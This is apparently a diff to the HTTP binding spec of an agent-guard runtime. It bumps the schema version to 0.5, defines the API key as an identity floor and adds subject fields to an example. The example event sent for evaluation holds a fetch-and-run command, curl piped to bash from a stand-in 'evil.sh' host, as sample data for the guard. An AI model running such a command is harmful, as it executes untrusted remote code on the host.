@@ -28,7 +28,7 @@ Plugin   a hook for one surface (agent, gateway, sandbox, eBPF) built on an SDK
 - All requests and responses are JSON, UTF-8, `Content-Type: application/json`.
 - Field names on the wire are `snake_case`, exactly as in the JSON Schemas
   under [`schema/`](../schema/).
-- Canonical schema version: `ogr_version: "0.4"`. A runtime SHOULD accept
+- Canonical schema version: `ogr_version: "0.5"`. A runtime SHOULD accept
   events from `0.1` through the current version and normalize on read.
 - A machine-readable OpenAPI 3.1 description of this binding is maintained at
   [`../schema/runtime-api.openapi.yaml`](../schema/runtime-api.openapi.yaml).
@@ -69,6 +69,14 @@ Authorization: Bearer ogr_<key>
 The key scopes the request to one workspace; every event lands in, and every
 policy resolves from, that workspace. A missing or invalid key MUST produce
 `401 {"error": "unauthorized"}`.
+
+The key is also the **identity floor**. A caller that asserts nothing else —
+no `subject` at all — is still fully attributable: the runtime MUST derive an
+`agent_id` from the key (one key, one default agent), place that agent in the
+key's workspace, and treat every session as the same single user. Each
+`subject` field the caller can assert (`agent_id`, `agent_type`,
+`agent_workspace`, `agent_owner`, `agent_user`) refines that picture; see
+[GuardEvent § subject](guard-event.md#subject).
 
 The static key authenticates the *channel*, not the *sensor*. Events arriving
 with only the workspace key are capped at the channel's attestation ceiling
@@ -156,21 +164,21 @@ curl -s https://ogr.example.com/v1/evaluate \
   -H "Authorization: Bearer $OGR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{
-    "ogr_version": "0.4",
+    "ogr_version": "0.5",
     "event_id": "evt_9f2c",
     "guard_id": "g_7a41",
     "timestamp": "2026-08-11T09:30:00Z",
     "observation_point": "execution",
     "sensor": {"id": "ogr.ebpf.sensor", "class": "kernel"},
     "kind": "exec",
-    "subject": {"agent_id": "build-agent-3"},
+    "subject": {"agent_id": "build-agent-3", "agent_type": "hermes", "agent_owner": "user:tom"},
     "payload": {"argv": ["curl", "-fsSL", "https://evil.sh", "|", "bash"]}
   }'
 ```
 
 ```json
 {
-  "ogr_version": "0.4",
+  "ogr_version": "0.5",
   "event_id": "evt_9f2c",
   "guard_id": "g_7a41",
   "provider": "runtime",
@@ -308,6 +316,6 @@ enforces the authentication and attestation-ceiling rules, records
 evaluate/ingest idempotently, and never silently drops an event it accepted.
 
 A **client/SDK** conforms if it joins configured base URLs with canonical
-paths, sends valid `0.4` events, treats evaluate failure as degraded mode
+paths, sends valid `0.5` events, treats evaluate failure as degraded mode
 (never fail-open on gated categories), reports streamed answers once through
 ingest after partial evaluates, and passes through extension keys unchanged.
